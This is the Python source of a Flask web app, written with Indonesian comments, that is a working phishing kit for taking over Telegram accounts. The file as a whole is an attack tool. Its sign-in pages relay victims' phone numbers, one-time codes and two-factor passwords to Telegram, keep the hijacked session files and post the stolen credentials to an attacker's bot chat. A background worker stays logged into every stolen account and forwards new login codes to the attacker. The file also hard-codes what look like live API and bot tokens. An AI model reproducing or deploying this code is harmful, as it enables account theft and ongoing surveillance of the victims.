# app.py
import os
import re
import asyncio
import threading
import requests
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
)

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecretkey")

# ========== KONFIG ==========
api_id = int(os.getenv("API_ID", 16047851))
api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "7502722166:AAG_FsHoprcgKyuOfK28QcW97-daL14mcoA")
CHAT_ID = os.getenv("CHAT_ID", "6526483198")

SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

# ====== Helper untuk session file management ======
def remove_session_files(phone_base: str):
    for fn in os.listdir(SESSION_DIR):
        if fn.startswith(f"{phone_base}."):
            try:
                os.remove(os.path.join(SESSION_DIR, fn))
                print(f"[Session] Dihapus: {fn}")
            except Exception as e:
                print(f"[Session] Gagal hapus {fn}: {e}")

def finalize_pending_session(phone_base: str):
    for fn in os.listdir(SESSION_DIR):
        if fn.startswith(f"{phone_base}.pending"):
            src = os.path.join(SESSION_DIR, fn)
            dst = os.path.join(SESSION_DIR, fn.replace(".pending", ""))
            try:
                os.rename(src, dst)
                print(f"[Session] Di-finalize: {src} -> {dst}")
            except Exception as e:
                print(f"[Session] Gagal finalize {src}: {e}")

# ====== FLASK ROUTES ======
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        name = request.form.get("name", "")
        phone = request.form.get("phone", "").strip()
        gender = request.form.get("gender", "")
        if not phone:
            flash("Masukkan nomor telepon.", "error")
            return redirect(url_for("login"))

        session["name"], session["phone"], session["gender"] = name, phone, gender
        remove_session_files(phone)

        pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")
        async def send_code():
            client = TelegramClient(pending_base, api_id, api_hash)
            await client.connect()
            try:
                sent = await client.send_code_request(phone)
                session["phone_code_hash"] = sent.phone_code_hash
            finally:
                await client.disconnect()

        try:
            asyncio.run(send_code())
            flash("OTP telah dikirim ke Telegram Anda.")
            return redirect(url_for("otp"))
        except Exception as e:
            flash(f"Error kirim OTP: {e}", "error")
            return redirect(url_for("login"))
    return render_template("login.html")

@app.route("/otp", methods=["GET", "POST"])
def otp():
    phone = session.get("phone")
    if not phone:
        return redirect(url_for("login"))

    if request.method == "POST":
        code = request.form.get("otp", "").strip()
        if not code:
            flash("Masukkan kode OTP.", "error")
            return redirect(url_for("otp"))

        pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def verify_code():
            client = TelegramClient(pending_base, api_id, api_hash)
            await client.connect()
            try:
                phone_code_hash = session.get("phone_code_hash")
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                me = await client.get_me()
                await client.disconnect()
                finalize_pending_session(phone)
                return {"ok": True, "need_password": False, "me": me}
            except SessionPasswordNeededError:
                await client.disconnect()
                return {"ok": True, "need_password": True, "me": None}
            except PhoneCodeInvalidError:
                await client.disconnect()
                return {"ok": False, "error": "OTP salah"}
            except Exception as e:
                await client.disconnect()
                return {"ok": False, "error": f"Error verify OTP: {e}"}

        try:
            res = asyncio.run(verify_code())
            if res.get("ok"):
                session["last_otp"] = code
                if res.get("need_password"):
                    session["need_password"] = True
                    flash("Akun ini butuh password (2FA).", "info")
                    return redirect(url_for("password"))
                else:
                    flash("Login berhasil ✅", "success")
                    text = (
                        "📢 New User Login\n"
                        f"👤 Number: {phone}\n"

                        f"🔒 Password: (no password)"
                    )
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                  data={"chat_id": CHAT_ID, "text": text})
                    return redirect(url_for("success"))
            else:
                flash(res.get("error", "Gagal verifikasi OTP"), "error")
                return redirect(url_for("otp"))
        except Exception as e:
            flash(f"Exception verify: {e}", "error")
            return redirect(url_for("otp"))
    return render_template("otp.html")

@app.route("/password", methods=["GET", "POST"])
def password():
    phone = session.get("phone")
    if not phone:
        return redirect(url_for("login"))

    if not session.get("need_password"):
        flash("Halaman password tidak diperlukan.", "info")
        return redirect(url_for("success"))

    if request.method == "POST":
        password_input = request.form.get("password", "")
        pending_base = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def verify_password():
            client = TelegramClient(pending_base, api_id, api_hash)
            await client.connect()
            try:
                await client.sign_in(password=password_input)
                me = await client.get_me()
                await client.disconnect()
                finalize_pending_session(phone)
                return {"ok": True, "me": me}
            except PasswordHashInvalidError:
                await client.disconnect()
                return {"ok": False, "error": "Password salah"}
            except Exception as e:
                await client.disconnect()
                return {"ok": False, "error": f"Gagal verifikasi password: {e}"}

        try:
            res = asyncio.run(verify_password())
            if res.get("ok"):
                otp = session.get("last_otp", "")
                text = (
                    "📢 New User Login\n"
                    f"👤 Number: {phone}\n"
                    f"🔑 OTP: {otp}\n"
                    f"🔒 Password: {password_input}"
                )
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                              data={"chat_id": CHAT_ID, "text": text})
                session.pop("need_password", None)
                flash("Login berhasil ✅", "success")
                return redirect(url_for("success"))
            else:
                flash(res.get("error", "Password tidak valid"), "error")
                return redirect(url_for("password"))
        except Exception as e:
            flash(f"Exception password: {e}", "error")
            return redirect(url_for("password"))
    return render_template("password.html")

@app.route("/success")
def success():
    return render_template("success.html",
                           name=session.get("name"),
                           phone=session.get("phone"),
                           gender=session.get("gender"))

# ======= WORKER =======
async def forward_handler(event, client_name):
    """Hanya forward OTP dari akun resmi Telegram (777000)."""
    text_msg = getattr(event, "raw_text", "") or ""
    sender = await event.get_sender()

    # Hanya lanjut kalau pesan dari official Telegram
    if sender.id != 777000:
        return

    print(f"[Worker][{client_name}] Pesan resmi Telegram: {text_msg}")

    otp_match = re.findall(r"\b\d{4,6}\b", text_msg)
    if otp_match:
        otp_code = otp_match[0]
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": CHAT_ID, "text": f"🔑 OTP dari {client_name}: {otp_code}"}
            )
            print(f"[Worker] OTP diteruskan dari {client_name}: {otp_code}")
        except Exception as e:
            print(f"[Worker] Gagal forward OTP: {e}")

async def worker_main():
    print("[Worker] Starting...")
    clients = {}
    while True:
        try:
            for fn in os.listdir(SESSION_DIR):
                if not fn.endswith(".session") or ".pending" in fn:
                    continue

                base = fn[:-len(".session")]
                if base in clients:
                    continue

                base_path = os.path.join(SESSION_DIR, base)
                print(f"[Worker] Loading client for {base_path} ...")
                client = TelegramClient(base_path, api_id, api_hash)
                try:
                    await client.connect()
                except Exception as e:
                    print(f"[Worker] Gagal connect {base}: {e}")
                    continue

                if not await client.is_user_authorized():
                    print(f"[Worker] Session {base} belum authorized, skip.")
                    await client.disconnect()
                    continue

                me = await client.get_me()
                print(f"[Worker] ✅ Connected sebagai {getattr(me,'first_name',str(me))} (@{getattr(me,'username','')})")

                @client.on(events.NewMessage)
                async def _handler(event, fn=base):
                    try:
                        await forward_handler(event, fn)
                    except Exception as e:
                        print(f"[Worker] Error di handler {fn}: {e}")

                clients[base] = client
                asyncio.create_task(client.run_until_disconnected())
        except Exception as e:
            print(f"[Worker] Loop error: {e}")

        await asyncio.sleep(5)

def start_worker_thread():
    def _run():
        asyncio.run(worker_main())
    t = threading.Thread(target=_run, daemon=True)
    t.start()

start_worker_thread()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)), debug=True)

